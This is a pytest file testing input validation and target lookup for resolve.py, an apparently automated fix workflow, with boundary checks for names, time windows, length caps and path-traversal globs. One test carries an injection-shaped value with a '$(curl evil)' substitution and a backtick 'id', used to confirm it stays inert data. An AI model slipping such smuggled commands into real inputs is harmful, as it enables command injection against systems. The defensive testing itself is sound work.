"""resolve.py: each input bound at its edge and one past it, and the target lookup.

Each test names the mutant it kills: the change to resolve.py that would let it pass wrongly.
"""

import json

import pytest

import resolve
from resolve import InputError, branch_for, load_target, validate_inputs

GOOD = {
    "target": "shop-api",
    "problem_id": "System.NullReferenceException at Orders.Checkout",
    "window_start": "2026-10-05T08:00:00Z",
    "window_end": "2026-10-05T09:00:00Z",
    "finding": "Null order lines on checkout",
    "brief": "Suspect Orders/Checkout.cs, lines not loaded",
    "dry_run": "true",
}
WORKSPACE = "00000000-1111-2222-3333-444444444444"
CONFIG = {"targets": {"shop-api": {"repo": "example-org/shop-api", "allow": ["src/**"], "workspace": WORKSPACE}}}


def with_(**kw):
    return {**GOOD, **kw}


def test_good_inputs_pass():
    assert validate_inputs(GOOD)["target"] == "shop-api"


# target: ^[a-z0-9-]{1,40}$ (mutant: widened regex or length)
@pytest.mark.parametrize("value", ["a", "a" * 40, "x-1"])
def test_target_edges_accepted(value):
    validate_inputs(with_(target=value))


@pytest.mark.parametrize("value", ["", "a" * 41, "Shop", "a/b", "a b", "a_b", "../x"])
def test_target_bad_rejected(value):
    with pytest.raises(InputError, match="target"):
        validate_inputs(with_(target=value))


# problem_id: 1-1000 printable chars, no newlines (mutant: length off by one, or newline allowed)
def test_problem_id_edges():
    validate_inputs(with_(problem_id="x"))
    validate_inputs(with_(problem_id="x" * 1000))
    for bad in ["", "x" * 1001, "a\nb", "a\rb", "a\tb", "a\x00b"]:
        with pytest.raises(InputError, match="problem_id"):
            validate_inputs(with_(problem_id=bad))


def test_injection_shaped_problem_id_passes_through_as_data():
    pid = 'x$(curl evil)`id`"; | where 1==1'
    assert validate_inputs(with_(problem_id=pid))["problem_id"] == pid


# window (mutant: start<=end allowed, 24h cap off by one, non-Z accepted)
def test_window_exactly_24h_accepted():
    validate_inputs(with_(window_start="2026-10-04T09:00:00Z", window_end="2026-10-05T09:00:00Z"))


def test_window_over_24h_rejected():
    with pytest.raises(InputError, match="24 hours"):
        validate_inputs(with_(window_start="2026-10-04T08:59:59Z", window_end="2026-10-05T09:00:00Z"))


def test_window_equal_rejected():
    with pytest.raises(InputError, match="before"):
        validate_inputs(with_(window_start="2026-10-05T09:00:00Z", window_end="2026-10-05T09:00:00Z"))


def test_window_seven_fraction_digits_accepted():
    validate_inputs(with_(window_start="2026-10-05T08:00:00.1234567Z", window_end="2026-10-05T09:00:00.0000001Z"))


@pytest.mark.parametrize("value", ["2026-10-05T08:00:00", "2026-10-05T08:00:00+00:00", "2026-10-05", "2026-13-05T08:00:00Z", "x"])
def test_window_bad_format_rejected(value):
    with pytest.raises(InputError, match="window_start"):
        validate_inputs(with_(window_start=value))


# finding <= 400, brief <= 1500 (mutant: cap off by one)
def test_finding_and_brief_caps():
    validate_inputs(with_(finding="f" * 400, brief="b" * 1500))
    with pytest.raises(InputError, match="finding"):
        validate_inputs(with_(finding="f" * 401))
    with pytest.raises(InputError, match="brief"):
        validate_inputs(with_(brief="b" * 1501))


# dry_run (mutant: anything truthy accepted)
@pytest.mark.parametrize("value", ["yes", "True", "1", ""])
def test_dry_run_strict(value):
    with pytest.raises(InputError, match="dry_run"):
        validate_inputs(with_(dry_run=value))


def test_error_messages_never_carry_the_value():
    with pytest.raises(InputError) as e:
        validate_inputs(with_(problem_id="SECRET\nVALUE"))
    assert "SECRET" not in str(e.value)


# target lookup (mutant: unknown key or malformed entry tolerated)
def test_known_target_resolves():
    t = load_target(CONFIG, "shop-api")
    assert (t["owner"], t["name"], t["allow"], t["workspace"]) == ("example-org", "shop-api", ["src/**"], WORKSPACE)


def test_unknown_target_rejected():
    with pytest.raises(InputError, match="no such key"):
        load_target(CONFIG, "other")


@pytest.mark.parametrize("entry", [
    {"repo": "no-slash", "allow": ["src/**"], "workspace": WORKSPACE},
    {"repo": "o/r", "allow": [], "workspace": WORKSPACE},
    {"repo": "o/r", "allow": "src/**", "workspace": WORKSPACE},
    {"repo": "o/r", "allow": ["../x"], "workspace": WORKSPACE},
    {"repo": "o/r", "allow": ["/abs"], "workspace": WORKSPACE},
    {"repo": "o/r", "allow": ["src\\x"], "workspace": WORKSPACE},
    {"repo": "o/r", "allow": ["src/**"], "workspace": "not-a-guid"},
    {"repo": "o/r", "allow": ["src/**"]},
])
def test_malformed_entry_rejected(entry):
    with pytest.raises(InputError, match="config|allow"):
        load_target({"targets": {"t": entry}}, "t")


def test_branch_is_fixed_prefix_and_hash8():
    b = branch_for("abc")
    assert b == "autofix/ba7816bf"


def test_main_writes_outputs(tmp_path, monkeypatch):
    cfg = tmp_path / "targets.json"
    cfg.write_text(json.dumps(CONFIG))
    out = tmp_path / "out"
    monkeypatch.setenv("GITHUB_OUTPUT", str(out))
    for k, v in GOOD.items():
        monkeypatch.setenv("INPUT_" + k.upper(), v)
    assert resolve.main(["resolve.py", str(cfg)]) == 0
    lines = dict(line.split("=", 1) for line in out.read_text().splitlines())
    assert lines["repo"] == "example-org/shop-api"
    assert json.loads(lines["allow"]) == ["src/**"]
    assert lines["branch"].startswith("autofix/")


def test_main_fails_on_bad_input(tmp_path, monkeypatch):
    cfg = tmp_path / "targets.json"
    cfg.write_text(json.dumps(CONFIG))
    monkeypatch.setenv("GITHUB_OUTPUT", str(tmp_path / "out"))
    for k, v in with_(target="BAD").items():
        monkeypatch.setenv("INPUT_" + k.upper(), v)
    assert resolve.main(["resolve.py", str(cfg)]) == 1
    assert not (tmp_path / "out").exists()
